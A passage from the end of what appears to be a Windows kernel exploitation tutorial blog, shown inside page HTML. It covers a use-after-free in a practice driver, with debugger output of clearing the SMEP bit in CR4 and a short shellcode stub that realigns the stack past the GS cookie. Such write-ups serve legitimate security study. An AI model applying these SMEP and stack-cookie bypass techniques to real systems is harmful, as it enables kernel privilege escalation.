+</span></span><span class="line"><span class="cl"><span class="mi">6</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="p">.</span><span class="n">formats</span> <span class="n">cr4</span>
+</span></span><span class="line"><span class="cl"><span class="n">Evaluate</span> <span class="nl">expression</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Hex</span><span class="p">:</span>     <span class="mo">00000000</span><span class="err">`</span><span class="mf">001506f</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Decimal</span><span class="p">:</span> <span class="mi">1378040</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">Decimal</span> <span class="p">(</span><span class="kt">unsigned</span><span class="p">)</span> <span class="o">:</span> <span class="mi">1378040</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Octal</span><span class="p">:</span>   <span class="mo">0000000000000005203370</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Binary</span><span class="p">:</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00010101</span> <span class="mo">00000110</span> <span class="mi">11111000</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Chars</span><span class="p">:</span>   <span class="p">........</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Time</span><span class="p">:</span>    <span class="n">Fri</span> <span class="n">Jan</span> <span class="mi">16</span> <span class="mi">23</span><span class="o">:</span><span class="mi">47</span><span class="o">:</span><span class="mi">20</span> <span class="mi">1970</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Float</span><span class="p">:</span>   <span class="n">low</span> <span class="mf">1.93105e-039</span> <span class="n">high</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Double</span><span class="p">:</span>  <span class="mf">6.80842e-318</span>
+</span></span><span class="line"><span class="cl"><span class="mi">6</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="n">t</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffff8c05</span><span class="err">`</span><span class="n">a9a9a3f9</span> <span class="mf">0f22e0</span>          <span class="n">mov</span>     <span class="n">cr4</span><span class="p">,</span><span class="n">rax</span>
+</span></span><span class="line"><span class="cl"><span class="mi">6</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="p">.</span><span class="n">formats</span> <span class="n">cr4</span>
+</span></span><span class="line"><span class="cl"><span class="n">Evaluate</span> <span class="nl">expression</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Hex</span><span class="p">:</span>     <span class="mo">00000000</span><span class="err">`</span><span class="mf">000506f</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Decimal</span><span class="p">:</span> <span class="mi">329464</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">Decimal</span> <span class="p">(</span><span class="kt">unsigned</span><span class="p">)</span> <span class="o">:</span> <span class="mi">329464</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Octal</span><span class="p">:</span>   <span class="mo">0000000000000001203370</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Binary</span><span class="p">:</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000101</span> <span class="mo">00000110</span> <span class="mi">11111000</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Chars</span><span class="p">:</span>   <span class="p">........</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Time</span><span class="p">:</span>    <span class="n">Sun</span> <span class="n">Jan</span>  <span class="mi">4</span> <span class="mi">20</span><span class="o">:</span><span class="mi">31</span><span class="o">:</span><span class="mo">04</span> <span class="mi">1970</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Float</span><span class="p">:</span>   <span class="n">low</span> <span class="mf">4.61677e-040</span> <span class="n">high</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">Double</span><span class="p">:</span>  <span class="mf">1.62777e-318</span> 
+</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>But, when you try to execute that shellcode we will see a BSOD with the stop code: <code>KERNEL_SECURITY_CHECK_FAILURE (139)</code>.</p>
+<h4>Stack Canary / GS Cookie<span class="hx-absolute -hx-mt-20" id="stack-canary--gs-cookie"></span>
+    <a href="#stack-canary--gs-cookie" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>Since we are 2 call instructions deep, the return address created from the initial call rcx of <code>g_UseAfterFreeObjectNonPagedPool-&gt;Callback()</code> should be at rsp+8, so we’ll just have to add these instructions to our shellcode.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">0</span><span class="o">:</span>  <span class="mi">48</span> <span class="mi">83</span> <span class="n">c4</span> <span class="mi">08</span>             <span class="n">add</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x8</span>
+</span></span><span class="line"><span class="cl"><span class="mi">4</span><span class="o">:</span>  <span class="n">c3</span>                      <span class="n">ret</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Thus, here we can align the stack to bypass the GS Cookie.</p>
+<h2>Conclusion<span class="hx-absolute -hx-mt-20" id="conclusion"></span>
+    <a href="#conclusion" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Once you have your custom shell script, you can run it in two different ways:</p>
+<ol>
+<li>Directly from the FakeObj-&gt;Buffer (no need to disable SMEP)</li>
+<li>Making a jump into your userland function before disabling SMEP</li>
+</ol>
+<p>I&rsquo;m sorry I haven&rsquo;t posted a token hijacking exploit yet; for now, you&rsquo;ll have to make do with the SMEP bypass/disable method. I&rsquo;ll update this post with the final exploit in the future.</p>
+
+        </div><div class="hx-mt-16"></div><div class="hx-mb-8 hx-flex hx-items-center hx-border-t hx-pt-8 dark:hx-border-neutral-800 contrast-more:hx-border-neutral-400 dark:contrast-more:hx-border-neutral-400 print:hx-hidden"><a
+        href="/winint-compilation/winint-wfownership/"
+        title="Taking Back Control - Windows File Ownership"
+        class="hx-flex hx-max-w-[50%] hx-items-center hx-gap-1 hx-py-4 hx-text-base hx-font-medium hx-text-gray-600 hx-transition-colors [word-break:break-word] hover:hx-text-primary-600 dark:hx-text-gray-300 md:hx-text-lg ltr:hx-ml-auto ltr:hx-pl-4 ltr:hx-text-right rtl:hx-mr-auto rtl:hx-pr-4 rtl:hx-text-left"
+      >Taking Back Control - Windows File Ownership<svg class="hx-inline hx-h-5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg></a></div></main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx-bg-gray-100 hx-pb-[env(safe-area-inset-bottom)] dark:hx-bg-neutral-900 print:hx-bg-transparent"><div class="hx-mx-auto hx-flex hx-gap-2 hx-py-2 hx-px-4 hx-max-w-screen-xl"><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx-group hx-h-7 hx-rounded-md hx-px-2 hx-text-left hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=12 class="group-data-[theme=light]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="group-data-[theme=light]:hx-hidden">Light</span><svg height=12 class="group-data-[theme=dark]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="group-data-[theme=dark]:hx-hidden">Dark</span></div>
+</button>
+</div><hr class="dark:hx-border-neutral-800" /><div
+      class="hextra-custom-footer hx-max-w-screen-xl hx-pl-[max(env(safe-area-inset-left),1.5rem)] hx-pr-[max(env(safe-area-inset-right),1.5rem)] hx-text-gray-600 dark:hx-text-gray-400"
+    ></div></footer>
+    
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/lib/flexsearch/flexsearch.bundle.min.0425860527cc9968f9f049421c7a56b39327d475e2e3a8f550416be3a9134327.js" integrity="sha256-BCWGBSfMmWj58ElCHHpWs5Mn1HXi46j1UEFr46kTQyc="></script>
+    <script defer src="/en.search.js" integrity=""></script><link type="text/css" rel="stylesheet" href="/lib/katex/katex.min.7e5db7914b97e596a36c1abb67ccc7f174f8bb71d38c9a88c55b262ed1737f97.css" integrity="sha256-fl23kUuX5ZajbBq7Z8zH8XT4u3HTjJqIxVsmLtFzf5c=" />
+<script defer src="/lib/katex/katex.min.9f45307c5794ed247a0d095f3a62e52ef2215a67b2327203a7fd919959ae79d1.js" integrity="sha256-n0UwfFeU7SR6DQlfOmLlLvIhWmeyMnIDp/2RmVmuedE="></script>
+<script defer src="/lib/katex/auto-render.min.7b57d427ac6270677daf8d8380ded2cc73336f9149a167b8e1fe0d6ef66604ae.js" integrity="sha256-e1fUJ6xicGd9r42DgN7SzHMzb5FJoWe44f4NbvZmBK4="></script>
+<script defer src="/lib/katex/mhchem.min.f0ca03df194b8c3d6017ff455db6a0ef98857905663fa311a6cded788b15340b.js" integrity="sha256-8MoD3xlLjD1gF/9FXbag75iFeQVmP6MRps3teIsVNAs="></script>
+<script>
+  
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\begin{equation}", right: "\\end{equation}", display: true },
+        {left: "\\begin{align}", right: "\\end{align}", display: true},
+        {left: "\\begin{alignat}", right: "\\end{alignat}", display: true},
+        {left: "\\begin{gather}", right: "\\end{gather}", display: true},
+        {left: "\\begin{CD}", right: "\\end{CD}", display: true},
+        { left: "\\[", right: "\\]", display: true },
+      ],
+      throwOnError: false,
+    });
+  });
+</script>
+
+  </body>
+</html>
